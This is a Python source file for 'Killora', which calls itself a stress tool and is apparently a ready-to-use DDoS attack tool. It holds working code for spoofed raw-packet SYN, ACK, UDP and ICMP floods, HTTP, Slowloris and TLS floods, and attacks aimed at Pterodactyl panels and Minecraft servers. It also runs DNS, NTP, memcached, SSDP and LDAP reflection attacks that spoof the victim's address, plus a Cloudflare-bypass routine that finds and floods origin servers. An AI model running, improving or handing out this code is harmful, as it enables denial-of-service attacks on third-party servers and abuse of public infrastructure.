#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Killora v1.0.0 - high throughput multi-process stress tool
made by BrokenCodeZ
"""
import contextlib, ipaddress, multiprocessing as mp, os, random, re, socket
import struct, string, subprocess, sys, time

VERSION = "1.0.0"
MAX_FLOOD = 1_000_000_000
AUTHOR = "BrokenCodeZ"
HOSTHDR = None
USETLS = False

C = dict(r="\033[0m", g="\033[1;32m", y="\033[1;33m", c="\033[1;36m",
         rd="\033[1;31m", b="\033[1;34m", m="\033[1;35m", d="\033[2m", w="\033[1;37m")

def col(k, s): return f"{C.get(k,'')}{s}{C['r']}"
def clear(): os.system("clear")
def say(s): print(f"{col('c','[*]')} {s}")
def ok(s): print(f"{col('g','[+]')} {s}")
def bad(s): print(f"{col('rd','[x]')} {s}")
def warn(s): print(f"{col('y','[!]')} {s}")

BANNER = r"""
  ██╗  ██╗██╗██╗     ██╗      ██████╗ ██████╗  █████╗
  ██║ ██╔╝██║██║     ██║     ██╔═══██╗██╔══██╗██╔══██╗
  █████╔╝ ██║██║     ██║     ██║   ██║██████╔╝███████║
  ██╔═██╗ ██║██║     ██║     ██║   ██║██╔══██╗██╔══██║
  ██║  ██╗██║███████╗███████╗╚██████╔╝██║  ██║██║  ██║
  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"""

# ───────────────────────── net ─────────────────────────
CF_V4 = ["173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
         "141.101.64.0/18","108.162.192.0/18","190.93.240.0/20","188.114.96.0/20",
         "197.234.240.0/22","198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
         "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22"]
_CF = [ipaddress.ip_network(n) for n in CF_V4]

def is_ip(s):
    try: ipaddress.ip_address(s); return True
    except ValueError: return False

def is_cf(ip):
    if not is_ip(ip): return False
    a = ipaddress.ip_address(ip)
    return any(a in n for n in _CF)

def resolve(host, port=80):
    if is_ip(host): return host, [host]
    try:
        ips = sorted({x[4][0] for x in socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)})
        return (ips[0] if ips else None), ips
    except socket.gaierror:
        return None, []

SUBS = ["direct","origin","origin-www","ftp","mail","webmail","cpanel","whm","dev",
        "staging","stage","test","beta","vpn","ssh","sftp","api","admin","portal",
        "panel","node","nodes","wings","daemon","mc","game","db","mysql","backend",
        "internal","intranet","assets","static","media","old","new","s1","s2"]

def origin_scan(domain):
    found = set()
    say(f"origin discovery: {domain}")
    for s in SUBS:
        with contextlib.suppress(socket.gaierror):
            for x in socket.getaddrinfo(f"{s}.{domain}", None, socket.AF_INET):
                ip = x[4][0]
                if not is_cf(ip) and not ip.startswith(("10.","127.","0.")): found.add(ip)
    for url in (f"https://crt.sh/?q=%25.{domain}&output=json",
                f"https://api.hackertarget.com/hostsearch/?q={domain}"):
        with contextlib.suppress(Exception):
            import urllib.request
            raw = urllib.request.urlopen(url, timeout=12).read().decode("utf8", "ignore")
            for m in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", raw):
                if not is_cf(m) and not m.startswith(("10.","127.","0.")): found.add(m)
    return sorted(found)

def verify_vhost(ip, domain, port=443):
    import ssl
    ctx = ssl._create_unverified_context()
    try:
        s = socket.create_connection((ip, port), 8)
        if port == 443 or USETLS:
            s = ctx.wrap_socket(s, server_hostname=domain)
        s.send(f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\n"
               f"Connection: close\r\n\r\n".encode())
        line = s.recv(300).decode("utf8", "ignore").splitlines()[0]
        s.close()
        ok(f"origin alive -> {line}")
        return True
    except Exception as e:
        bad(f"origin fail -> {e}")
        return False

# ───────────────────────── packet ─────────────────────────
def csum(data):
    if len(data) & 1: data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF); s += s >> 16
    return ~s & 0xFFFF

def rnd_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rnd_str(n=8):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def set16(pkt, off, val, coff):
    old = (pkt[off] << 8) | pkt[off+1]
    pkt[off] = val >> 8; pkt[off+1] = val & 0xFF
    hc = (pkt[coff] << 8) | pkt[coff+1]
    s = (~hc & 0xFFFF) + (~old & 0xFFFF) + val
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    hc = ~s & 0xFFFF
    pkt[coff] = hc >> 8; pkt[coff+1] = hc & 0xFF

def raw_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    with contextlib.suppress(OSError):
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 << 20)
    return s

def ip_hdr(src, dst, proto, plen):
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20+plen, random.randint(0, 65535),
                    0, 64, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))
    return h[:10] + struct.pack("!H", csum(h)) + h[12:]

def tpl_tcp(dst, dport, flags, plen=0):
    src = rnd_ip(); sport = random.randint(1024, 65535); seq = random.getrandbits(32)
    payload = b"\x00" * plen
    seg = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, flags, 64240, 0, 0)
    ps = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(seg)+plen)
    c = csum(ps + seg + payload)
    seg = seg[:16] + struct.pack("!H", c) + seg[18:]
    return bytearray(ip_hdr(src, dst, 6, len(seg)+plen) + seg + payload)

def tpl_udp(dst, dport, payload, src=None):
    src = src or rnd_ip(); sport = random.randint(1024, 65535); ln = 8 + len(payload)
    h = struct.pack("!HHHH", sport, dport, ln, 0)
    ps = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 17, ln)
    c = csum(ps + h + payload) or 0xFFFF
    h = struct.pack("!HHHH", sport, dport, ln, c)
    return bytearray(ip_hdr(src, dst, 17, ln) + h + payload)

UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
       "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
       "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Mobile Safari/537.36",
       "curl/8.5.0"]

def http_reqs(host, n=24, method="GET"):
    out = []
    for _ in range(n):
        p = f"/?{rnd_str(9)}={rnd_str(11)}"
        out.append((f"{method} {p} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAS)}\r\n"
                    f"Accept: */*\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n"
                    f"X-Forwarded-For: {rnd_ip()}\r\nCF-Connecting-IP: {rnd_ip()}\r\n"
                    f"Cache-Control: no-cache\r\n\r\n").encode())
    return out

def _vh(ip): return HOSTHDR or ip

# ───────────────────────── raw vectors ─────────────────────────
CHUNK = 512

def _rawloop(pkt, coff, s, quota, deadline, sent, errs, seq_off=None, dest=None):
    n = 0
    while True:
        for _ in range(CHUNK):
            try:
                set16(pkt, 20, 1024 + (random.getrandbits(16) % 64000), coff)
                if seq_off:
                    q = random.getrandbits(32)
                    set16(pkt, seq_off, q >> 16, coff)
                    set16(pkt, seq_off + 2, q & 0xFFFF, coff)
                if dest: s.sendto(pkt, dest)
                else: s.send(pkt)
            except OSError:
                errs.value += 1
        n += CHUNK; sent.value += CHUNK
        if n >= quota or time.time() >= deadline: return

def v_syn(ip, port, q, dl, sent, errs, idx):
    _rawloop(tpl_tcp(ip, port, 0x02), 36, raw_sock(), q, dl, sent, errs, 24)

def v_ack(ip, port, q, dl, sent, errs, idx):
    _rawloop(tpl_tcp(ip, port, 0x10), 36, raw_sock(), q, dl, sent, errs, 24)

def v_rst(ip, port, q, dl, sent, errs, idx):
    _rawloop(tpl_tcp(ip, port, 0x04), 36, raw_sock(), q, dl, sent, errs, 24)

def v_xmas(ip, port, q, dl, sent, errs, idx):
    _rawloop(tpl_tcp(ip, port, 0x29), 36, raw_sock(), q, dl, sent, errs, 24)

def v_psh(ip, port, q, dl, sent, errs, idx):
    _rawloop(tpl_tcp(ip, port, 0x18, 256), 36, raw_sock(), q, dl, sent, errs, 24)

def v_udp_spoof(ip, port, q, dl, sent, errs, idx):
    _rawloop(tpl_udp(ip, port, os.urandom(1400)), 26, raw_sock(), q, dl, sent, errs)

def v_udp_plain(ip, port, q, dl, sent, errs, idx):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    with contextlib.suppress(OSError): s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 << 20)
    pl = os.urandom(1400); n = 0
    while True:
        for _ in range(CHUNK):
            try: s.sendto(pl, (ip, port))
            except OSError: errs.value += 1
        n += CHUNK; sent.value += CHUNK
        if n >= q or time.time() >= dl: return

def v_icmp(ip, port, q, dl, sent, errs, idx):
    s = raw_sock(); n = 0
    while True:
        for _ in range(CHUNK):
            try:
                pl = struct.pack("!BBHHH", 8, 0, 0, random.randint(0, 65535), 1) + os.urandom(56)
                s.send(bytearray(ip_hdr(rnd_ip(), ip, 1, len(pl)) + pl))
            except OSError: errs.value += 1
        n += CHUNK; sent.value += CHUNK
        if n >= q or time.time() >= dl: return

# ───────────────────────── conn vectors ─────────────────────────
def _tcp_conn(ip, port, quota, dl, sent, errs, idx, req, tls=False, sni=None):
    lg = struct.pack("ii", 1, 0); n = 0
    ctx = None
    if tls:
        import ssl as _s
        ctx = _s._create_unverified_context()
        with contextlib.suppress(Exception): ctx.set_ciphers("DEFAULT@SECLEVEL=1")
    while True:
        for _ in range(48):
            s = None
            try:
                s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, lg)
                s.settimeout(4); s.connect((ip, port))
                if tls: s = ctx.wrap_socket(s, server_hostname=sni or ip)
                if req: s.send(req)
                s.close()
            except OSError:
                errs.value += 1
                if s:
                    with contextlib.suppress(Exception): s.close()
        n += 48; sent.value += 48
        if n >= quota or time.time() >= dl: return

def v_connect(ip, port, q, dl, sent, errs, idx):
    _tcp_conn(ip, port, q, dl, sent, errs, idx, b"", tls=USETLS, sni=HOSTHDR)

def v_http(ip, port, q, dl, sent, errs, idx):
    _tcp_conn(ip, port, q, dl, sent, errs, idx, random.choice(http_reqs(_vh(ip))), tls=USETLS, sni=HOSTHDR)

def v_https(ip, port, q, dl, sent, errs, idx):
    _tcp_conn(ip, port, q, dl, sent, errs, idx, random.choice(http_reqs(_vh(ip))), tls=True, sni=HOSTHDR)

def v_post(ip, port, q, dl, sent, errs, idx):
    body = ("a=" + rnd_str(200)).encode()
    req = (f"POST /?{rnd_str(8)} HTTP/1.1\r\nHost: {_vh(ip)}\r\nUser-Agent: {random.choice(UAS)}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n"
           f"Connection: close\r\n\r\n").encode() + body
    _tcp_conn(ip, port, q, dl, sent, errs, idx, req, tls=USETLS, sni=HOSTHDR)

def v_slow(ip, port, q, dl, sent, errs, idx):
    n = 0
    while True:
        for _ in range(40):
            s = None
            try:
                s = socket.socket(); s.settimeout(5); s.connect((ip, port))
                if USETLS:
                    import ssl
                    s = ssl._create_unverified_context().wrap_socket(s, server_hostname=HOSTHDR or ip)
                s.send(f"GET /{rnd_str(6)} HTTP/1.1\r\nHost: {_vh(ip)}\r\n".encode())
                for _ in range(3):
                    s.send(f"X-{rnd_str(4)}: {rnd_str(20)}\r\n".encode()); time.sleep(0.12)
                s.close()
            except OSError:
                errs.value += 1
                if s:
                    with contextlib.suppress(Exception): s.close()
        n += 40; sent.value += 40
        if n >= q or time.time() >= dl: return

def v_tls(ip, port, q, dl, sent, errs, idx):
    import ssl
    ctx = ssl._create_unverified_context()
    n = 0
    while True:
        for _ in range(48):
            s = None
            try:
                s = socket.socket(); s.settimeout(5); s.connect((ip, port))
                ctx.wrap_socket(s, server_hostname=HOSTHDR or ip); s.close()
            except OSError:
                errs.value += 1
                if s:
                    with contextlib.suppress(Exception): s.close()
        n += 48; sent.value += 48
        if n >= q or time.time() >= dl: return

def v_ptero(ip, port, q, dl, sent, errs, idx):
    h = _vh(ip)
    r = random.choice([
        f"GET /auth/login HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: close\r\n\r\n",
        f"GET /auth/password HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: close\r\n\r\n",
        f"GET /api/system HTTP/1.1\r\nHost: {h}\r\nAccept: application/json\r\nConnection: close\r\n\r\n",
        f"GET /assets/svgs/pterodactyl.svg?{rnd_str(8)} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: close\r\n\r\n",
        f"GET /?cb={random.randint(1,999999)} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: close\r\n\r\n",
    ]).encode()
    _tcp_conn(ip, port, q, dl, sent, errs, idx, r, tls=USETLS, sni=HOSTHDR)

def v_mc(ip, port, q, dl, sent, errs, idx):
    hs = b"\x00\x00" + bytes([len(ip)]) + ip.encode() + struct.pack("!H", port) + b"\x01"
    _tcp_conn(ip, port, q, dl, sent, errs, idx, b"\x10" + hs + b"\x01\x00")

# ───────────────────────── amplification ─────────────────────────
DNS_S = ["8.8.8.8","1.1.1.1","9.9.9.9","208.67.222.222","156.154.70.1","8.26.56.26"]
NTP_S = ["162.159.200.1","216.239.35.0","129.6.15.28","132.163.96.1"]
MEM_S = ["1.2.3.4","2.3.4.5","3.4.5.6"]
LDAP_S = ["1.1.1.1","8.8.8.8"]
SSDP_S = ["239.255.255.250"]

def _amp(ip, payload, dport, servers, q, dl, sent, errs, idx):
    srv = random.choice(servers)
    pkt = tpl_udp(srv, dport, payload, src=ip)
    _rawloop(pkt, 26, raw_sock(), q, dl, sent, errs, dest=(srv, 0))

def v_dns(ip, p, q, dl, sent, errs, idx):
    _amp(ip, b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07killora\x03com\x00\x00\xff\x00\x01",
         53, DNS_S, q, dl, sent, errs, idx)

def v_ntp(ip, p, q, dl, sent, errs, idx):
    _amp(ip, b"\x17\x00\x03\x2a" + b"\x00"*4, 123, NTP_S, q, dl, sent, errs, idx)

def v_mem(ip, p, q, dl, sent, errs, idx):
    _amp(ip, b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n", 11211, MEM_S, q, dl, sent, errs, idx)

def v_ssdp(ip, p, q, dl, sent, errs, idx):
    _amp(ip, b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\n"
             b"MX: 2\r\nST: ssdp:all\r\n\r\n", 1900, SSDP_S, q, dl, sent, errs, idx)

def v_ldap(ip, p, q, dl, sent, errs, idx):
    _amp(ip, bytes.fromhex("30840000002a020102638400000023040003") + b"ldap" + bytes.fromhex("a30a04020801"),
         389, LDAP_S, q, dl, sent, errs, idx)

VECTORS = {"syn":v_syn,"ack":v_ack,"rst":v_rst,"xmas":v_xmas,"psh":v_psh,
           "udp_spoof":v_udp_spoof,"udp_plain":v_udp_plain,"icmp":v_icmp,
           "connect":v_connect,"http":v_http,"https":v_https,"post":v_post,
           "slow":v_slow,"tls":v_tls,"ptero":v_ptero,"mc":v_mc,
           "dns":v_dns,"ntp":v_ntp,"mem":v_mem,"ssdp":v_ssdp,"ldap":v_ldap}

RAW_VECS = {"syn","ack","rst","xmas","psh","udp_spoof","icmp","dns","ntp","mem","ssdp","ldap"}

# ───────────────────────── engine ─────────────────────────
def _worker(vec, ip, port, quota, dl, idx, sent, errs):
    with contextlib.suppress(Exception):
        VECTORS[vec](ip, port, quota, dl, sent, errs, idx)

def launch(vec, host, port, flood, duration, procs, hosthdr=None, tls=False):
    global HOSTHDR, USETLS
    ip, ips = resolve(host, port)
    if not ip: return bad("resolve fail")
    if vec in RAW_VECS and os.geteuid() != 0: return bad("raw vector ke liye root chahiye (sudo -i)")
    if hosthdr: HOSTHDR = hosthdr
    USETLS = tls or port == 443
    procs = max(1, min(procs, 32))
    flood = max(procs, min(int(flood), MAX_FLOOD))
    quota = flood // procs
    dl = time.time() + duration
    sent = mp.Value("Q", 0); errs = mp.Value("Q", 0)
    print()
    ok(f"target {host} ({ip}) :{port}")
    ok(f"vector {vec}   procs {procs}   flood {flood:,}   tls {USETLS}   host {HOSTHDR or '-'}")
    ps = []
    for i in range(procs):
        p = mp.Process(target=_worker, args=(vec, ip, port, quota, dl, i, sent, errs), daemon=True)
        p.start(); ps.append(p)
    t0 = time.time(); prev = 0
    try:
        while any(p.is_alive() for p in ps):
            time.sleep(1); s = sent.value
            sys.stdout.write(f"\r  sent {col('g',f'{s:,}')}  pps {col('y',f'{s-prev:,}')}  "
                             f"err {col('rd',errs.value)}  {col('d',f'{time.time()-t0:.0f}s')}   ")
            sys.stdout.flush(); prev = s
    except KeyboardInterrupt:
        for p in ps: p.terminate()
    for p in ps: p.join(timeout=2)
    print()
    el = max(time.time()-t0, 1)
    ok(f"total {sent.value:,} pkts / {el:.0f}s  avg {sent.value/el:,.0f} pps  err {errs.value}")

# ───────────────────────── menu ─────────────────────────
MENU = [
 ("UDP Spoof Flood",        "L4", "udp_spoof",  80,    "random src udp"),
 ("UDP Plain Flood",        "L4", "udp_plain",  80,    "big datagram, no spoof"),
 ("TCP SYN Flood",          "L4", "syn",        80,    "half-open exhaustion"),
 ("TCP ACK Flood",          "L4", "ack",        80,    "firewall choke"),
 ("TCP RST Flood",           "L4", "rst",        443,   "reset spam"),
 ("TCP XMAS Flood",         "L4", "xmas",       80,    "all flags set"),
 ("TCP PSH+ACK Flood",      "L4", "psh",        80,    "data push"),
 ("ICMP Flood",             "L4", "icmp",       0,     "ping flood"),
 ("TCP Connect Flood",      "L4", "connect",    80,    "full handshake"),
 ("HTTP GET Flood",         "L7", "http",       80,    "raw socket, vhost aware"),
 ("HTTPS GET Flood",        "L7", "https",      443,   "tls + vhost, no read"),
 ("HTTP POST Flood",        "L7", "post",       80,    "body flood"),
 ("Slowloris",              "L7", "slow",       80,    "header drip"),
 ("TLS Handshake Flood",    "L7", "tls",        443,   "ssl exhaustion"),
 ("Pterodactyl Panel Hit",  "PT", "ptero",      443,   "login + api + assets"),
 ("Minecraft Node Kill",    "PT", "mc",         25565, "handshake ping"),
 ("DNS Amplification",      "AMP","dns",        53,    "ANY query"),
 ("NTP Amplification",      "AMP","ntp",        123,   "monlist"),
 ("Memcached Amplification","AMP","mem",        11211, "stats payload"),
 ("SSDP Amplification",     "AMP","ssdp",       1900,  "M-SEARCH"),
 ("LDAP Amplification",     "AMP","ldap",       389,   "search query"),
 ("Cloudflare Bypass",      "BYP",None,         443,   "origin find + verify + hit"),
 ("Benchmark (self pps)",   "SYS",None,         0,     "local speed test"),
]

def menu():
    clear(); print(col('m', BANNER))
    print(f"  {col('w','Killora')} {col('d','v'+VERSION)}   {col('d','made by '+AUTHOR)}")
    print(col('d', "  " + "─"*62))
    last = None
    for i, (n, l, _, p, d) in enumerate(MENU, 1):
        if l != last:
            print(f"\n  {col('c','['+l+']')}"); last = l
        print(f"  {col('y',f'{i:>2})')} {n:<26} {col('d',f'[{l}]')}  {col('d',d)}")
    print(f"\n  {col('rd',' 0)')} Exit    {col('c','R)')} Recon    {col('c','S)')} System")
    print(col('d', "  " + "─"*62))

def ask(p, d=None, cast=int, lo=None, hi=None):
    while True:
        v = input(f"{col('c','>')} {p}" + (f" {col('d','['+str(d)+']')}" if d is not None else "") + ": ").strip()
        if not v and d is not None: return d
        try:
            v = cast(v)
            if lo is not None and v < lo: continue
            if hi is not None and v > hi: v = hi
            return v
        except Exception: warn("invalid")

def default_procs(): return max(2, min((os.cpu_count() or 1) * 2, 8))

def ask_target():
    t = input(f"{col('c','>')} target (ip / domain): ").strip()
    t = re.sub(r"^https?://", "", t).split("/")[0]
    return t or ask_target()

def run(idx):
    name, layer, vec, dport, _ = MENU[idx]

    if name.startswith("Cloudflare"):
        d = ask_target()
        port = ask("port", dport)
        ip, ips = resolve(d, port)
        if not ip: return bad("resolve fail")
        if not any(is_cf(i) for i in ips): return warn(f"CF nahi hai ({', '.join(ips)}) - direct IP attack karo")
        org = origin_scan(d)
        if not org: return warn("origin nahi mila")
        for o in org:
            if verify_vhost(o, d, port): break
        else: return warn("koi origin alive nahi")
        f = ask("flood", 2000000, hi=MAX_FLOOD)
        dur = ask("duration sec", 60)
        pr = ask("procs", default_procs())
        return launch("https" if port == 443 else "http", o, port, f, dur, pr, hosthdr=d)

    if name.startswith("Benchmark"):
        f = ask("flood", 2000000, hi=MAX_FLOOD)
        dur = ask("duration sec", 20)
        pr = ask("procs", default_procs())
        return launch("syn", "1.1.1.1", 80, f, dur, pr)

    t = ask_target()
    port = ask("port", dport)
    hh = None
    if is_ip(t):
        hh = input(f"{col('c','>')} Host header / vhost domain (khali chhodo agar nahi): ").strip() or None
    f = ask("flood (max 1000000000)", 2000000, hi=MAX_FLOOD)
    dur = ask("duration sec", 60)
    pr = ask("procs", default_procs())
    launch(vec, t, port, f, dur, pr, hosthdr=hh, tls=(port == 443))

def recon():
    clear(); print(col('m', "RECON"))
    print("  1) CF detect + origin finder + verify\n  2) Port scan\n  3) Vhost verify (ip + domain)\n  0) back")
    c = input(col('c','> ')).strip()
    if c == "1":
        d = input("domain: ").strip()
        ip, ips = resolve(d)
        if not ip: bad("resolve fail")
        else:
            ok(f"{d} -> {', '.join(ips)}")
            if any(is_cf(i) for i in ips):
                bad("Cloudflare detected")
                o = origin_scan(d)
                for x in o:
                    ok(f"candidate {x}"); verify_vhost(x, d)
                if not o: warn("origin nahi mila")
            else: ok("CF nahi hai, direct IP attack karo")
    elif c == "2":
        h = input("host: ").strip(); ip, _ = resolve(h)
        for p in [22,80,443,8080,8443,13981,25565,3306]:
            s = socket.socket(); s.settimeout(1.2)
            try: s.connect((ip, p)); ok(f"{p} open")
            except Exception: pass
            finally: s.close()
    elif c == "3":
        ip = input("ip: ").strip(); d = input("domain: ").strip(); p = ask("port", 443)
        verify_vhost(ip, d, p)
    input(col('d', "\nenter..."))

def sysinfo():
    clear(); print(col('m', "SYSTEM"))
    print(f"  cpu cores : {os.cpu_count()}")
    print(f"  root      : {'yes' if os.geteuid()==0 else 'no'}")
    print(f"  suggested : procs {default_procs()}")
    with contextlib.suppress(Exception):
        import resource
        print(f"  nofile    : {resource.getrlimit(resource.RLIMIT_NOFILE)[0]}")
    print(col('d', "\n  zyada pps: root + ulimit -n 1048576 + procs badhao"))
    input(col('d', "\nenter..."))

def main():
    if os.geteuid() == 0:
        with contextlib.suppress(Exception):
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (1048576, 1048576))
    while True:
        menu()
        c = input(f"\n{col('c','killora')} {col('d','>')} ").strip()
        if c == "0": return
        if c.upper() == "R": recon(); continue
        if c.upper() == "S": sysinfo(); continue
        if not c.isdigit() or not (1 <= int(c) <= len(MENU)): warn("invalid"); time.sleep(0.5); continue
        try: run(int(c) - 1)
        except KeyboardInterrupt: warn("aborted")
        input(col('d', "\nenter..."))

if __name__ == "__main__":
    with contextlib.suppress(KeyboardInterrupt): main()